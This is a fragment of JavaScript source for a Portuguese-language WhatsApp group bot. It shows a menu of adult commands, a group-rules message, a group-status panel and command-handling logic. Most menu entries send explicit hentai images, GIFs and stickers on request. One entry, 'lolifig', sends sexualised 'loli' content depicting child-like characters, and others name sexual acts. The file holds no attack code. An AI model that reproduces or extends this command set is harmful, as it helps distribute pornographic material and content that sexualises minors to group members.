┃⋆│💎➢ ${prefix}yuri  ⟨🔞⟩
┃⋆│➥ hentai lesbico 
┃⋆│💎➢ ${prefix}elfa  ⟨🔞⟩
┃⋆│➥ hentai com elfas
┃⋆│💎➢ ${prefix}blowjob ⟨🔞⟩
┃⋆│➥ gif em forma de sticker boquete
┃⋆│💎➢ ${prefix}neko2  ⟨🔞⟩
┃⋆│➥ imagem de neko hentai
┃⋆│💎➢ ${prefix}neko ⟨Texto⟩ ⟨🔞⟩
┃⋆│➥ imagem de neko normal
┃⋆│💎➢ ${prefix}beijar2 ⟨🔞⟩
┃⋆│➥ manda um gif em sticker beijando
┃⋆│💎➢ ${prefix}sorrir ⟨🔞⟩
┃⋆│➥ manda um sticker animado sorrindo anime
┃⋆│💎➢ ${prefix}hentaifig ⟨🔞⟩
┃⋆│➥ manda gif em sticker hentai
┃⋆│💎➢ ${prefix}nfig ⟨🔞⟩
┃⋆│➥ manda um sticker de uma neko
┃⋆│💎➢ ${prefix}nekofig ⟨🔞⟩
┃⋆│➥ manda um sticker de uma neko hentai 
┃⋆│💎➢ ${prefix}lolifig ⟨🔞⟩
┃⋆│➥ manda sticker de loli hentai
┃⋆│💎➢ ${prefix}chorar ⟨🔞⟩
┃⋆│➥ manda gif em sticker chorando
┃⋆│💎➢ ${prefix}kill ⟨🔞⟩
┃⋆│➥ manda gif em sticker de morte
┃⋆│💎➢ ${prefix}baka ⟨🔞⟩
┃⋆│➥ manda gif em sticker baka
┃⋆│💎➢ ${prefix}cum ⟨🔞⟩
┃⋆│➥ manda imagem hentai de gozada
┃⋆│💎➢ ${prefix}bunda ⟨🔞⟩
┃⋆│➥ manda imagem hentai de bunda
┃⋆│💎➢ ${prefix}sovaco ⟨🔞⟩
┃⋆│➥ manda imagem hentai de sovaco
┃⋆│💎➢ ${prefix}hentaipe ⟨🔞⟩
┃⋆│➥ manda imagem hentai de pe
┃⋆│💎➢ ${prefix}sideoppai ⟨🔞⟩
┃⋆│➥ manda imagem hentai de peito de lado
┃⋆│💎➢ ${prefix}vtubers ⟨🔞⟩
┃⋆│➥ manda imagem hentai de vtubers
┃⋆│💎➢ ${prefix}hentai ⟨🔞⟩
┃⋆│➥ manda imagem hentai aleatório
┃⋆│💎➢ ${prefix}hentainuds ⟨🔞⟩
┃⋆│➥ manda imagem hentai nuds
┃⋆│💎➢ ${prefix}eroyuri ⟨🔞⟩
┃⋆│➥ manda imagem hentai lesbico sexualizado
┃⋆│💎➢ ${prefix}erok ⟨🔞⟩
┃⋆│➥ manda imagem hentai de raposa
┃⋆│💎➢ ${prefix}lewdkemo ⟨🔞⟩
┃⋆│➥ manda imagem hentai sexual
┃⋆│💎➢ ${prefix}food ⟨🔞⟩
┃⋆│➥ manda um gif sticker comendo
┃⋆│💎➢ ${prefix}yurigif ⟨🔞⟩
┃⋆│➥ manda um gif sticker lesbico
┃⋆│💎➢ ${prefix}pegif ⟨🔞⟩
┃⋆│➥ manda um gif sticker batendo com o pe
┃⋆│💎➢ ${prefix}pussygif ⟨🔞⟩
┃⋆│➥ manda um gif sticker de siririca
┃⋆│💎➢ ${prefix}wallpaper ⟨🔞⟩
┃⋆│➥ manda um wallpaper de celular
┃⋆│💎➢ ${prefix}nhentai (codigo) ⟨🔞⟩
┃⋆│➥ manda em pdf hentai do nhentai
┃⋆│💎➢ ${prefix}spank ⟨🔞⟩
┃⋆│➥ manda imagem hentai de tapa
┃⋆│💎➢ ${prefix}classic ⟨🔞⟩
┃⋆│➥ manda hentai classic
┃⋆│💎➢ ${prefix}siririca ⟨🔞⟩
┃⋆│➥ manda hentai de siririca
┃⋆│💎➢ ${prefix}lick ⟨🔞⟩
┃⋆│➥ manda fig de linguada hentai
┃⋆│💎➢ ${prefix}fanart ⟨🔞⟩
┃⋆│➥ manda fanart de 2k a 4k
┃⋆│💎➢ ${prefix}milf ⟨🔞⟩
┃⋆│➥ manda imagem milf hentai
┃⋆│💎➢ ${prefix}cosplay ⟨🔞⟩
┃⋆│➥ imagem cosplay(não +18)
┃⋆│💎➢ ${prefix}ecchi ⟨🔞⟩
┃⋆│➥ manda imagem ecchi
┃⋆│💎➢ ${prefix}cringe ⟨🔞⟩
┃⋆│➥ manda fig cringe
┃⋆│💎➢ ${prefix}dance ⟨🔞⟩
┃⋆│➥ manda fig dancando
┃⋆│💎➢ ${prefix}corar ⟨🔞⟩
┃⋆│➥ manda fig corando
┃⋆│💎➢ ${prefix}gasm ⟨🔞⟩
┃⋆│➥ manda fig orgasmo
┃⋆│💎➢ ${prefix}bonk ⟨🔞⟩
┃⋆│➥ manda fig bonk
┃⋆│💎➢ ${prefix}apertar ⟨🔞⟩
┃⋆│➥ manda fig apertar
┃⋆│💎➢ ${prefix}carinho ⟨🔞⟩
┃⋆│➥ manda fig carinho
┃⋆│💎➢ ${prefix}piscar ⟨🔞⟩
┃⋆│➥ manda fig piscar
┃⋆╰───────────────────
╰━════════════════════⊷
⭐👸Cσɱαɳԃσʂ ԃҽ ԋҽɳƚαι👸⭐`})

}

if (selectedButton == `Regras`) {
loli.updatePresence(from, Presence.composing)
                    tod = await getBuffer(`https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT3ZzIMqwKi5DtBu8u7aCmV6Ra585_hdvx_1noOMsBPYMup-OPWSDUZ908S&s=10`)
                    loli.sendMessage(from, tod, image, { quoted: say1, thumbnail:null, caption: `_*BEM VINDO AO ${groupName}  *_

DIVIRTA-SE, *DENTRO DAS NOSSAS LEIS* 🦘

existem 3 tipos de regras, vou dar uma explicada nelas

❎ regras verdes, penalidades menores, você tomará avisos ou até mesmo banimento temporário
🚫 *regras vermelhas, penalidades médias, são regras bem específicas com direito a ban permanente*
✡️ _regras roxas, são penalidades especiais, meio q essas dependem do humor do adm, ele decidirá sua punição, então é melhor ter cuidado_

▬▬▬▬▬▬▬▬▬▬୧✬҉୨▬▬▬▬▬▬▬▬▬▬

_*AGORA VAMOS PARA AS REGRAS!*_

▬▬▬▬▬✅REGRAS VERDES✅▬▬▬▬▬▬

❌gadiar
❌flood/corrente (figu max 6)
❌tretar (so com autorização dos adm)
❌encher o saco dos membros, aq é pra ser legal porra
❌pedir conteúdo

▬▬▬▬🚫REGRAS VERMELHAS🚫▬▬▬▬▬
❌cp/scat/gore etc
❌link
❌travas
❌reclamar dos conteúdos
❌ qualquer preconceito, aq é uma zona neutra na internet, sem preconceito ou associações
❌invadir pv
❌qualquer tipo de divulgação

▬▬▬▬▬✡️REGRAS ROXAS✡️▬▬▬▬▬▬
❌questionar as regras (isso é uma ditadura) 

 ⭐👸Rҽɠɾαʂ ԃσ ɠɾυρσ👸⭐`})
                 
 }
 
 
if (selectedButton == `Info grupo`) {
loli.updatePresence(from, Presence.composing)
texto = isAntiflod ? 'Ativado' : 'Desativado'
texto0 = isAntiteste ? 'Ativado' : 'Desativado'
texto1 = isAntiLink ? 'Ativado' : 'Desativado'
texto2 = isAntictt ? 'Ativado' : 'Desativado'
texto3 = isAutofigu ? 'Ativado' : 'Desativado'
texto4 = isLevelingOn ? 'Ativado' : 'Desativado'
texto5 = isWelcome ? 'Ativado' : 'Desativado'
ppUrl = await loli.getProfilePicture(from) // deixe vazio para obter o seu
buffer = await getBuffer(ppUrl)
loli.sendMessage(from, buffer, image, {quoted: mek, thumbnail:null, caption: `
┌─❖
│*「 ⚙️-❪STTS/GP❫-⚙️ 」*
└┬❖
   │${groupName}
┌┤⪧ Membros: ${groupMembers.length}
│✑ Admins* : ${groupAdmins.length}
│└────────────┈ ⳹
┼────────────┈ ⳹
┌┤「 🏓 ON/OFF 🏓 」
││
││⪧ Anti Flod: ${texto}
││⪧ Anti Fake: ${texto0}
││⪧ Anti Link: ${texto1}
││⪧ Anti Cont: ${texto2}
││⪧ Auto Figu: ${texto3}
││⪧ Level Up:  ${texto4} 
││⪧ Welcome: ${texto5}
│├────────
││ _Ativado/Desativado_
│└────────
╰─━━━━─── • ───━━━━ ⳹
`})
}

if (listRM.includes("listadmin")){
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
menus = ["1", "2", "3"]
res = menus[Math.floor(Math.random() * menus.length)]
const useLevel = getLevelingLevel(sender)
const useXp = getLevelingXp(sender)
const useTime = getRegisterTime(sender) 
const requireXp = 20 * Math.pow(useLevel, 2) + 150 * useLevel + 1000
if (useLevel === undefined && chec === undefined) addLevelingId(sender)
const checATM = checkATMuser(sender)
const chatss = `${totalchat.length}`
const comandost = totalcmd
result = fs.readFileSync(`./database/audios/menu` + res + `.mp3`)
loli.sendMessage(from, result, audio, {mimetype: 'audio/mp4', quoted: mek, ptt: true})
wew = fs.readFileSync('./database/help/menu.png')
loli.sendMessage(from, wew, image , {sendEphemeral: true, contextInfo: { forwardingScore: 508, isForwarded: true}, quoted: mek, thumbnail: fs.readFileSync('./database/help/bot.jpg'), caption: help(bateria, pushname, prefix, hr, chatss, ucapanFakereply, prema, checATM, useLevel, requireXp, useXp, patt) })
if(useLevel == undefined && useXp == undefined){
}
}

if (body == `${prefix}${command}`) {
hsl = `comando: ${prefix}${command} não existe`
loli.sendMessage(from, hsl, text, {quoted: mek, contextInfo: {mentionedJid: [sender]}})
console.log('\x1b[1;31m~\x1b[1;37m>', color('[ ERROR ]', "red"), color('Comando', "yellow"), color(`${prefix}${command}`, "yellow"), color('não registrado', "yellow"), color('de', "yellow"), color(pushname, "yellow"))
}
}
} catch (e) {
console.log('Error : %s', color(e, 'red'))
reply(ptbr.erro())
}
})
}
starts()